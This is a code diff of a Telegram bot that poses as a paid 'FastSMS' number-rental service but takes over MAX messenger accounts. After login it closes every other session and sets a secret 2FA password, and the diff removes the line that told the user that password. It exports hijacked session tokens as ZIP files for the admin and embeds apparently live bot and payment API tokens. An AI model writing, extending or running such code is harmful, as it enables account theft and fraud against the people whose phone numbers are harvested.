@@ -8,6 +8,7 @@ import sqlite3
 import zipfile
 import random
 import string
+import aiohttp
 from io import BytesIO
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -17,8 +18,14 @@ from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButto
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from pymax import Client as SocketMaxClient
 
-BOT_TOKEN = "8992822126:AAGn06w87GIZgTAJZD39v4pC_9-dNKEMm0c"
+BOT_TOKEN = "8685030648:AAFhNMFrG_c5RxxJ8xzIoGtiPWZ0KOhrj40"
 ADMIN_ID = 8632861931
+CRYPTO_BOT_TOKEN = "590536:AAUmWHZlRRABQzE8JrQwpjZpS1G7Z6gqZDx"
+PRICE_PER_PHONE = 3.75
+LOG_CHANNEL = "https://t.me/+y5m1F18c4dhhNWUy"
+REQUIRED_CHANNELS = [
+    {"https://t.me/+zBRefeG6YRwwMzA6"}
+]
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
@@ -27,25 +34,44 @@ dp = Dispatcher(storage=MemoryStorage())
 class AuthState(StatesGroup):
     waiting_for_code = State()
     waiting_for_password = State()
+    waiting_withdraw_amount = State()
+    waiting_broadcast = State()
+    waiting_new_price = State()
+    waiting_zip_count = State()
+    waiting_check_tokens = State()
 
 pending = {}
 accounts = {}
+users = {}
 ACCOUNTS_FILE = "accounts.json"
+USERS_FILE = "users.json"
 
-def load_accounts():
-    global accounts
+def load_data():
+    global accounts, users
     if os.path.exists(ACCOUNTS_FILE):
         with open(ACCOUNTS_FILE, "r") as f:
             accounts = json.load(f)
+    if os.path.exists(USERS_FILE):
+        with open(USERS_FILE, "r") as f:
+            users = json.load(f)
 
-def save_accounts():
+def save_data():
     with open(ACCOUNTS_FILE, "w") as f:
         json.dump(accounts, f, ensure_ascii=False, indent=4)
+    with open(USERS_FILE, "w") as f:
+        json.dump(users, f, ensure_ascii=False, indent=4)
 
-load_accounts()
+load_data()
 
 def gen_random_password():
     return ''.join(random.choices(string.ascii_letters + string.digits + "_@#%", k=12))
+
+def mask_username(username: str) -> str:
+    if not username:
+        return "неизвестный"
+    if len(username) <= 2:
+        return username[0] + "*" * (len(username) - 1)
+    return username[:2] + "*" * (len(username) - 4) + username[-2:]
 
 def get_device_id_from_session(work_dir):
     db_path = os.path.join(work_dir, "session.db")
@@ -91,118 +117,472 @@ def build_desktop_json(token, device_id, password, user_id, phone):
         "password": password if password else None
     }
 
-# ==================== МЕНЮ ====================
+def get_user_stats(uid):
+    uid_str = str(uid)
+    user = users.get(uid_str, {"balance": 0, "total_phones": 0, "total_earned": 0})
+    user_phones = len(accounts.get(uid_str, {}))
+    return {
+        "balance": user.get("balance", 0),
+        "total_phones": user.get("total_phones", 0),
+        "total_earned": user.get("total_earned", 0),
+        "current_phones": user_phones,
+        "price_per_phone": PRICE_PER_PHONE
+    }
 
-def accounts_keyboard(uid, is_admin=False):
+async def crypto_bot_create_check(amount):
+    url = "https://pay.crypt.bot/api/createCheck"
+    headers = {"Content-Type": "application/json"}
+    payload = {"asset": "USDT", "amount": str(amount)}
+    async with aiohttp.ClientSession() as session:
+        resp = await session.post(url, headers=headers, json=payload, params={"api_key": CRYPTO_BOT_TOKEN})
+        data = await resp.json()
+        return data
+
+async def check_subscription(user_id: int) -> bool:
+    for channel in REQUIRED_CHANNELS:
+        try:
+            member = await bot.get_chat_member(channel["username"], user_id)
+            if member.status in ["left", "kicked"]:
+                return False
+        except:
+            pass
+    return True
+
+def subscription_keyboard():
     builder = InlineKeyboardBuilder()
-    if is_admin:
-        builder.row(InlineKeyboardButton(text="📦 Скачать все токены (ZIP)", callback_data="admin_zip"))
-    builder.row(InlineKeyboardButton(text="➕ Добавить аккаунт", callback_data="add_account"))
-    for phone in accounts.get(str(uid), {}):
-        builder.row(InlineKeyboardButton(text=f"📱 {phone}", callback_data=f"acc_{phone}"))
+    for channel in REQUIRED_CHANNELS:
+        builder.row(InlineKeyboardButton(text=f"📢 {channel['username']}", url=channel["url"]))
+    builder.row(InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_sub"))
     return builder.as_markup()
 
-def account_actions_keyboard(phone):
+WELCOME_TEXT = """👋 Добро пожаловать в бота 🌐 FastSMS ⚡️
+
+📩 Получайте максимум, принимая СМС от нужных сервисов.
+💰 Прямые договорённости с покупателями — лучшие ставки за ваш номер.
+🏪 Сервис 24/7: обработка SMS мгновенная и полностью автоматическая — без ручного вмешательства.
+
+Цены:
+MАX — $3.50"""
+
+INSTRUCTION_TEXT = """📚 <b>Инструкция</b>
+
+1️⃣ Нажмите «⚡️ Сдать номер»
+2️⃣ Отправьте свой номер телефона 🇷🇺
+3️⃣ Дождитесь назначения контрагента и получения СМС (это может занять какое-то время, но чаще не более 30 секунд)
+4️⃣ Перешлите код в этот чат, чтобы завершить активацию
+5️⃣ После успешной активации средства будут зачислены на баланс 💰
+
+💡 Вы можете проверить баланс и историю в разделе «💼 Профиль»"""
+
+def menu_keyboard():
     builder = InlineKeyboardBuilder()
-    builder.row(InlineKeyboardButton(text="💻 Получить десктоп", callback_data=f"desk_{phone}"))
-    builder.row(InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_{phone}"))
-    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="my_accounts"))
+    builder.row(InlineKeyboardButton(text="📱 Сдать номер", callback_data="add_account"))
+    builder.row(InlineKeyboardButton(text="👤 Профиль", callback_data="profile"))
+    builder.row(InlineKeyboardButton(text="📚 Инструкция", callback_data="instruction"))
     return builder.as_markup()
+
+def admin_keyboard():
+    builder = InlineKeyboardBuilder()
+    builder.row(InlineKeyboardButton(text="📱 Сдать номер", callback_data="add_account"))
+    builder.row(InlineKeyboardButton(text="👤 Профиль", callback_data="profile"))
+    builder.row(InlineKeyboardButton(text="📚 Инструкция", callback_data="instruction"))
+    builder.row(InlineKeyboardButton(text="📦 Выгрузить аккаунты", callback_data="admin_zip"))
+    builder.row(InlineKeyboardButton(text="🔍 Проверить токены", callback_data="admin_check_tokens"))
+    builder.row(InlineKeyboardButton(text="⚙️ Админ-панель", callback_data="admin_panel"))
+    return builder.as_markup()
+
+def profile_keyboard():
+    builder = InlineKeyboardBuilder()
+    builder.row(InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw"))
+    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="check_sub"))
+    return builder.as_markup()
+
+def admin_panel_keyboard():
+    builder = InlineKeyboardBuilder()
+    builder.row(InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast"))
+    builder.row(InlineKeyboardButton(text="💵 Изменить цену", callback_data="admin_change_price"))
+    builder.row(InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"))
+    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="check_sub"))
+    return builder.as_markup()
+
+def token_check_keyboard():
+    builder = InlineKeyboardBuilder()
+    builder.row(InlineKeyboardButton(text="🗑 Удалить мёртвые токены", callback_data="admin_delete_dead"))
+    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="check_sub"))
+    return builder.as_markup()
+
+async def ensure_subscribed(message: types.Message) -> bool:
+    if await check_subscription(message.from_user.id):
+        return True
+    await message.answer(
+        "⚠️ Для использования бота нужно подписаться на каналы:",
+        reply_markup=subscription_keyboard()
+    )
+    return False
+
+async def notify_all_users(text: str):
+    notified = 0
+    for uid_str in users:
+        try:
+            await bot.send_message(int(uid_str), text)
+            notified += 1
+        except:
+            pass
+    return notified
+
+async def log_withdraw(user_id: int, amount: float):
+    """Отправляет лог о выводе в канал (без чека)."""
+    try:
+        user = await bot.get_chat(user_id)
+        username = user.username or user.first_name or str(user_id)
+        masked = mask_username(username)
+        text = (
+            f"💸 <b>Новый вывод</b>\n\n"
+            f"👤 Пользователь: <b>{masked}</b>\n"
+            f"💰 Сумма: <b>${amount}</b>"
+        )
+        await bot.send_message(LOG_CHANNEL, text, parse_mode="HTML")
+    except Exception as e:
+        logging.error(f"Ошибка логирования вывода: {e}")
+
+def get_all_accounts_list():
+    all_accs = []
+    for uid, accs in accounts.items():
+        for phone, data in accs.items():
+            all_accs.append({
+                "uid": uid,
+                "phone": phone,
+                "token": data.get("token", ""),
+                "user_id": data.get("user_id", 0),
+                "work_dir": data.get("work_dir", ""),
+                "password": data.get("password", "")
+            })
+    return all_accs
+
+def remove_account(uid, phone):
+    if uid in accounts and phone in accounts[uid]:
+        del accounts[uid][phone]
+        if not accounts[uid]:
+            del accounts[uid]
+
+async def check_token_valid(phone, work_dir):
+    try:
+        client = SocketMaxClient(phone=phone, work_dir=work_dir)
+        await client.start()
+        return True
+    except:
+        return False
 
 @dp.message(F.text == "/start")
 async def start(message: types.Message):
-    await message.answer("👋 Главное меню", reply_markup=types.ReplyKeyboardMarkup(
-        keyboard=[[types.KeyboardButton(text="👤 Мои аккаунты")]], resize_keyboard=True
-    ))
-
-@dp.message(F.text == "👤 Мои аккаунты")
-async def my_accounts(message: types.Message):
+    if not await ensure_subscribed(message):
+        return
     is_admin = (message.from_user.id == ADMIN_ID)
-    await message.answer("📱 Аккаунты:", reply_markup=accounts_keyboard(message.from_user.id, is_admin))
+    kb = admin_keyboard() if is_admin else menu_keyboard()
+    await message.answer(WELCOME_TEXT, reply_markup=types.ReplyKeyboardMarkup(
+        keyboard=[[types.KeyboardButton(text="📋 Меню")]], resize_keyboard=True
+    ))
+    await message.answer("📋 Навигация:", reply_markup=kb)
 
-@dp.callback_query(F.data == "my_accounts")
-async def cb_my_accounts(callback: types.CallbackQuery):
-    is_admin = (callback.from_user.id == ADMIN_ID)
-    await callback.message.edit_text("📱 Аккаунты:", reply_markup=accounts_keyboard(callback.from_user.id, is_admin))
+@dp.message(F.text == "📋 Меню")
+async def menu_button(message: types.Message):
+    if not await ensure_subscribed(message):
+        return
+    is_admin = (message.from_user.id == ADMIN_ID)
+    kb = admin_keyboard() if is_admin else menu_keyboard()
+    await message.answer("📋 Навигация:", reply_markup=kb)
+
+@dp.callback_query(F.data == "check_sub")
+async def cb_check_sub(callback: types.CallbackQuery):
+    if await check_subscription(callback.from_user.id):
+        await callback.message.delete()
+        is_admin = (callback.from_user.id == ADMIN_ID)
+        kb = admin_keyboard() if is_admin else menu_keyboard()
+        await callback.message.answer("✅ Подписка подтверждена!", reply_markup=types.ReplyKeyboardMarkup(
+            keyboard=[[types.KeyboardButton(text="📋 Меню")]], resize_keyboard=True
+        ))
+        await callback.message.answer("📋 Навигация:", reply_markup=kb)
+    else:
+        await callback.answer("❌ Вы не подписались на все каналы", show_alert=True)
+
+@dp.callback_query(F.data == "instruction")
+async def cb_instruction(callback: types.CallbackQuery):
+    await callback.message.answer(INSTRUCTION_TEXT, parse_mode="HTML")
+    await callback.answer()
+
+@dp.callback_query(F.data == "profile")
+async def cb_profile(callback: types.CallbackQuery):
+    stats = get_user_stats(callback.from_user.id)
+    text = (
+        f"👤 <b>Ваш профиль</b>\n\n"
+        f"📱 Активных номеров: <b>{stats['current_phones']}</b>\n"
+        f"📊 Всего сдано: <b>{stats['total_phones']}</b>\n"
+        f"💰 Заработано: <b>${stats['total_earned']}</b>\n"
+        f"💵 Баланс: <b>${stats['balance']}</b>\n"
+        f"📌 Цена за номер: <b>${stats['price_per_phone']}</b>"
+    )
+    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=profile_keyboard())
+    await callback.answer()
+
+@dp.callback_query(F.data == "withdraw")
+async def cb_withdraw(callback: types.CallbackQuery, state: FSMContext):
+    stats = get_user_stats(callback.from_user.id)
+    if stats['balance'] <= 0:
+        await callback.answer("❌ Недостаточно средств", show_alert=True)
+        return
+    await state.set_state(AuthState.waiting_withdraw_amount)
+    await callback.message.answer(f"💰 Баланс: <b>${stats['balance']}</b>\nВведите сумму для вывода чеком:", parse_mode="HTML")
+    await callback.answer()
+
+@dp.message(AuthState.waiting_withdraw_amount)
+async def withdraw_amount(message: types.Message, state: FSMContext):
+    try:
+        amount = float(message.text.strip())
+    except:
+        return await message.answer("❌ Введите число.")
+
+    stats = get_user_stats(message.from_user.id)
+    if amount <= 0 or amount > stats['balance']:
+        return await message.answer(f"❌ Сумма от 0.01 до {stats['balance']}.")
+
+    uid = str(message.from_user.id)
+    result = await crypto_bot_create_check(amount)
+
+    if result and result.get("ok"):
+        check_url = result.get("result", {}).get("check_url", "")
+        users[uid]["balance"] -= amount
+        save_data()
+        await log_withdraw(message.from_user.id, amount)
+        if check_url:
+            await message.answer(f"✅ Чек на <b>${amount}</b> создан!\n\n{check_url}", parse_mode="HTML")
+        else:
+            await message.answer(f"✅ Чек на <b>${amount}</b> создан! Проверьте в @CryptoBot", parse_mode="HTML")
+    else:
+        error = result.get("error", "Неизвестная ошибка") if result else "Нет ответа"
+        await message.answer(f"❌ Ошибка: {error}")
+
+    await state.clear()
+
+# ==================== ПРОВЕРКА ТОКЕНОВ ====================
+
+@dp.callback_query(F.data == "admin_check_tokens")
+async def cb_admin_check_tokens(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return await callback.answer("❌ Только для админа", show_alert=True)
+
+    all_accs = get_all_accounts_list()
+    total = len(all_accs)
+
+    if total == 0:
+        await callback.answer("❌ Нет аккаунтов", show_alert=True)
+        return
+
+    msg = await callback.message.answer(f"🔍 Проверяю <b>{total}</b> токенов...", parse_mode="HTML")
+
+    alive = 0
+    dead = 0
+    dead_list = []
+
+    for acc in all_accs:
+        valid = await check_token_valid(acc["phone"], acc["work_dir"])
+        if valid:
+            alive += 1
+        else:
+            dead += 1
+            dead_list.append(acc)
+
+    text = (
+        f"🔍 <b>Результаты проверки</b>\n\n"
+        f"✅ Живых: <b>{alive}</b>\n"
+        f"❌ Мёртвых: <b>{dead}</b>\n"
+        f"📱 Всего: <b>{total}</b>"
+    )
+
+    if dead > 0:
+        pending[ADMIN_ID] = {"dead_tokens": dead_list}
+        text += "\n\nНажмите кнопку чтобы удалить мёртвые токены."
+
+    await msg.edit_text(text, parse_mode="HTML", reply_markup=token_check_keyboard() if dead > 0 else None)
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_delete_dead")
+async def cb_admin_delete_dead(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return await callback.answer("❌ Только для админа", show_alert=True)
+
+    dead_data = pending.get(ADMIN_ID, {}).get("dead_tokens", [])
+    if not dead_data:
+        await callback.answer("❌ Нет мёртвых токенов", show_alert=True)
+        return
+
+    for acc in dead_data:
+        remove_account(acc["uid"], acc["phone"])
+
+    save_data()
+    count = len(dead_data)
+    pending[ADMIN_ID] = {}
+
+    await callback.message.edit_text(
+        f"🗑 Удалено <b>{count}</b> мёртвых токенов.",
+        parse_mode="HTML"
+    )
+    await callback.answer()
+
+# ==================== АДМИН-ПАНЕЛЬ ====================
+
+@dp.callback_query(F.data == "admin_panel")
+async def cb_admin_panel(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return await callback.answer("❌ Только для админа", show_alert=True)
+    await callback.message.edit_text("⚙️ Админ-панель:", reply_markup=admin_panel_keyboard())
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_broadcast")
+async def cb_admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id != ADMIN_ID:
+        return await callback.answer("❌ Только для админа", show_alert=True)
+    await state.set_state(AuthState.waiting_broadcast)
+    await callback.message.answer("📢 Введите текст для рассылки:")
+    await callback.answer()
+
+@dp.message(AuthState.waiting_broadcast)
+async def handle_broadcast(message: types.Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+    text = message.text
+    notified = await notify_all_users(text)
+    await message.answer(f"✅ Рассылка отправлена! Получили: <b>{notified}</b> пользователей.", parse_mode="HTML")
+    await state.clear()
+
+@dp.callback_query(F.data == "admin_change_price")
+async def cb_admin_change_price(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id != ADMIN_ID:
+        return await callback.answer("❌ Только для админа", show_alert=True)
+    await state.set_state(AuthState.waiting_new_price)
+    await callback.message.answer(f"💵 Текущая цена: <b>${PRICE_PER_PHONE}</b>\nВведите новую цену:", parse_mode="HTML")
+    await callback.answer()
+
+@dp.message(AuthState.waiting_new_price)
+async def handle_new_price(message: types.Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+    try:
+        new_price = float(message.text.strip())
+    except:
+        return await message.answer("❌ Введите число.")
+
+    global PRICE_PER_PHONE
+    old_price = PRICE_PER_PHONE
+    PRICE_PER_PHONE = new_price
+
+    await notify_all_users(
+        f"💰 <b>Изменение цены!</b>\n\n"
+        f"Старая цена: <b>${old_price}</b>\n"
+        f"Новая цена: <b>${new_price}</b>\n\n"
+        f"Сдавайте номера и зарабатывайте больше!"
+    )
+
+    await message.answer(f"✅ Цена изменена: <b>${old_price}</b> → <b>${new_price}</b>\nВсе пользователи уведомлены.", parse_mode="HTML")
+    await state.clear()
+
+@dp.callback_query(F.data == "admin_stats")
+async def cb_admin_stats(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return await callback.answer("❌ Только для админа", show_alert=True)
+
+    total_users = len(users)
+    total_phones = sum(u.get("total_phones", 0) for u in users.values())
+    total_earned = sum(u.get("total_earned", 0) for u in users.values())
+    total_balance = sum(u.get("balance", 0) for u in users.values())
+    active_phones = sum(len(accs) for accs in accounts.values())
+
+    text = (
+        f"📊 <b>Статистика</b>\n\n"
+        f"👥 Пользователей: <b>{total_users}</b>\n"
+        f"📱 Всего сдано номеров: <b>{total_phones}</b>\n"
+        f"📱 Активных номеров: <b>{active_phones}</b>\n"
+        f"💰 Всего заработано: <b>${total_earned}</b>\n"
+        f"💵 Баланс всех: <b>${total_balance}</b>\n"
+        f"📌 Текущая цена: <b>${PRICE_PER_PHONE}</b>"
+    )
+    await callback.message.answer(text, parse_mode="HTML")
+    await callback.answer()
 
 @dp.callback_query(F.data == "admin_zip")
-async def cb_admin_zip(callback: types.CallbackQuery):
+async def cb_admin_zip(callback: types.CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
-        await callback.answer("Только для админа")
+        return await callback.answer("❌ Только для админа", show_alert=True)
+
+    all_accs = get_all_accounts_list()
+    total = len(all_accs)
+
+    if total == 0:
+        await callback.answer("❌ Нет аккаунтов для выгрузки", show_alert=True)
         return
+
+    await state.set_state(AuthState.waiting_zip_count)
+    await state.update_data(zip_total=total)
+    await callback.message.answer(f"📦 Всего аккаунтов: <b>{total}</b>\nВведите количество для выгрузки:", parse_mode="HTML")
+    await callback.answer()
+
+@dp.message(AuthState.waiting_zip_count)
+async def handle_zip_count(message: types.Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    try:
+        count = int(message.text.strip())
+    except:
+        return await message.answer("❌ Введите число.")
+
+    data = await state.get_data()
+    total = data.get("zip_total", 0)
+
+    if count <= 0 or count > total:
+        return await message.answer(f"❌ Введите число от 1 до {total}.")
+
+    all_accs = get_all_accounts_list()
+    selected = all_accs[:count]
 
     zip_buffer = BytesIO()
     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for uid, accs in accounts.items():
-            for phone, data in accs.items():
-                token = data.get("token", "")
-                dev = get_device_id_from_session(data.get("work_dir", ""))
-                pwd = data.get("password", "")
-                uid_val = data.get("user_id", 0)
-                desktop = build_desktop_json(token, dev, pwd, uid_val, phone)
-                filename = f"{phone}.txt"
-                zf.writestr(filename, json.dumps(desktop, ensure_ascii=False, indent=4))
+        for acc in selected:
+            dev = get_device_id_from_session(acc["work_dir"])
+            desktop = build_desktop_json(acc["token"], dev, acc["password"], acc["user_id"], acc["phone"])
+            filename = f"{acc['phone']}.txt"
+            zf.writestr(filename, json.dumps(desktop, ensure_ascii=False, indent=4))
 
     zip_buffer.seek(0)
+
+    for acc in selected:
+        remove_account(acc["uid"], acc["phone"])
+    save_data()
+
     await bot.send_document(
         ADMIN_ID,
-        BufferedInputFile(zip_buffer.getvalue(), filename="all_tokens.zip"),
-        caption="📦 Все токены"
+        BufferedInputFile(zip_buffer.getvalue(), filename=f"tokens_{count}.zip"),
+        caption=f"📦 Выгружено {count} аккаунтов"
     )
-    await callback.answer("Архив отправлен!")
+    await message.answer(f"✅ Выгружено <b>{count}</b> аккаунтов. Они удалены из базы.", parse_mode="HTML")
+    await state.clear()
 
 @dp.callback_query(F.data == "add_account")
 async def cb_add_account(callback: types.CallbackQuery, state: FSMContext):
+    if not await check_subscription(callback.from_user.id):
+        await callback.answer("❌ Подпишитесь на каналы!", show_alert=True)
+        return
     await state.clear()
     await state.set_state(AuthState.waiting_for_code)
     await callback.message.answer("📱 Отправьте номер в формате +79111111111")
     await callback.answer()
 
-@dp.callback_query(F.data.startswith("acc_"))
-async def cb_account(callback: types.CallbackQuery):
-    phone = callback.data[4:]
-    await callback.message.edit_text(f"📱 {phone}", reply_markup=account_actions_keyboard(phone))
-    await callback.answer()
-
-@dp.callback_query(F.data.startswith("del_"))
-async def cb_delete(callback: types.CallbackQuery):
-    phone = callback.data[4:]
-    uid = str(callback.from_user.id)
-    if uid in accounts and phone in accounts[uid]:
-        del accounts[uid][phone]
-        save_accounts()
-    is_admin = (callback.from_user.id == ADMIN_ID)
-    await callback.message.edit_text("📱 Аккаунты:", reply_markup=accounts_keyboard(callback.from_user.id, is_admin))
-    await callback.answer("Удалено")
-
-@dp.callback_query(F.data.startswith("desk_"))
-async def cb_desk(callback: types.CallbackQuery):
-    phone = callback.data[5:]
-    uid = str(callback.from_user.id)
-    data = accounts.get(uid, {}).get(phone)
-    if not data:
-        await callback.answer("Аккаунт не найден")
-        return
-
-    token = data["token"]
-    user_id = data["user_id"]
-    work_dir = data["work_dir"]
-    dev = get_device_id_from_session(work_dir)
-    user_password = data.get("password", "")
-
-    desktop = build_desktop_json(token, dev, user_password, user_id, phone)
-    dp_path = f"{work_dir}/desktop_session.txt"
-    with open(dp_path, "w") as f:
-        json.dump(desktop, f, ensure_ascii=False, indent=4)
-
-    await bot.send_document(ADMIN_ID, FSInputFile(dp_path), caption=f"💻 Десктоп\n{phone}")
-    await bot.send_document(callback.from_user.id, FSInputFile(dp_path), caption=f"💻 Десктоп-сессия\n{phone}")
-    await callback.answer("Отправлено!")
-
 # ==================== ВХОД ====================
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\+7\d{10}$'))
 async def phone_handler(message: types.Message, state: FSMContext):
+    if not await ensure_subscribed(message):
+        await state.clear()
+        return
     phone = message.text.strip()
     uid = message.from_user.id
     work_dir = f"cache/{uid}/{phone}"
@@ -224,23 +604,15 @@ async def phone_handler(message: types.Message, state: FSMContext):
             await post_login(client, uid, phone, work_dir)
         except Exception as e:
             err = str(e).lower()
-            logging.error(f"Ошибка входа: {e}")
-
-            # Проверяем, не зарегистрирован ли аккаунт
             if "not registered" in err or "not found" in err or "unregistered" in err:
-                logging.info(f"Аккаунт {phone} не зарегистрирован, пробуем регистрацию...")
                 try:
-                    # Пробуем зарегистрировать
                     reg_client = SocketMaxClient(phone=phone, work_dir=work_dir, registration=True)
                     await reg_client.start()
-                    logging.info(f"Регистрация успешна!")
-                    # Обновляем клиент в pending
                     pending[uid]["client"] = reg_client
                     await post_login(reg_client, uid, phone, work_dir)
                     return
                 except Exception as reg_err:
                     err = str(reg_err).lower()
-                    logging.error(f"Ошибка регистрации: {reg_err}")
 
             if uid in pending:
                 if "block" in err: pending[uid]["status"] = "blocked"
@@ -250,7 +622,6 @@ async def phone_handler(message: types.Message, state: FSMContext):
                 else: pending[uid]["status"] = f"error:{e}"
 
     async def post_login(client, uid, phone, work_dir):
-        # Закрываем старые сессии
         try:
             sessions = await client.get_sessions()
             current_id = None
@@ -269,17 +640,13 @@ async def phone_handler(message: types.Message, state: FSMContext):
         except:
             pass
 
-        # Устанавливаем/меняем 2FA
         new_password = gen_random_password()
         try:
             await client.change_2fa(new_password)
-            logging.info(f"2FA сменён на {new_password}")
         except:
             try:
                 await client.set_2fa(new_password)
-                logging.info(f"2FA установлен: {new_password}")
-            except Exception as e:
-                logging.error(f"Ошибка 2FA: {e}")
+            except:
                 new_password = ""
 
         if uid in pending:
@@ -338,10 +705,15 @@ async def code_handler(message: types.Message, state: FSMContext):
             uid_str = str(uid)
             if uid_str not in accounts: accounts[uid_str] = {}
             accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir, "password": pwd_2fa}
-            save_accounts()
-            text = "✅ Аккаунт добавлен! Все старые сессии закрыты."
-            if pwd_2fa:
-                text += f"\n🔐 Пароль 2FA: {pwd_2fa}"
+
+            if uid_str not in users:
+                users[uid_str] = {"balance": 0, "total_phones": 0, "total_earned": 0}
+            users[uid_str]["total_phones"] += 1
+            users[uid_str]["total_earned"] += PRICE_PER_PHONE
+            users[uid_str]["balance"] += PRICE_PER_PHONE
+
+            save_data()
+            text = f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}"
             await msg.edit_text(text)
             del pending[uid]; await state.clear(); return
 
@@ -406,10 +778,15 @@ async def password_handler(message: types.Message, state: FSMContext):
         uid_str = str(uid)
         if uid_str not in accounts: accounts[uid_str] = {}
         accounts[uid_str][phone] = {"token": token, "user_id": vid, "work_dir": work_dir, "password": pwd_2fa}
-        save_accounts()
-        text = "✅ Аккаунт добавлен! Все старые сессии закрыты."
-        if pwd_2fa:
-            text += f"\n🔐 Пароль 2FA: {pwd_2fa}"
+
+        if uid_str not in users:
+            users[uid_str] = {"balance": 0, "total_phones": 0, "total_earned": 0}
+        users[uid_str]["total_phones"] += 1
+        users[uid_str]["total_earned"] += PRICE_PER_PHONE
+        users[uid_str]["balance"] += PRICE_PER_PHONE
+
+        save_data()
+        text = f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}"
         await msg.edit_text(text)
         del pending[uid]; await state.clear(); return
 
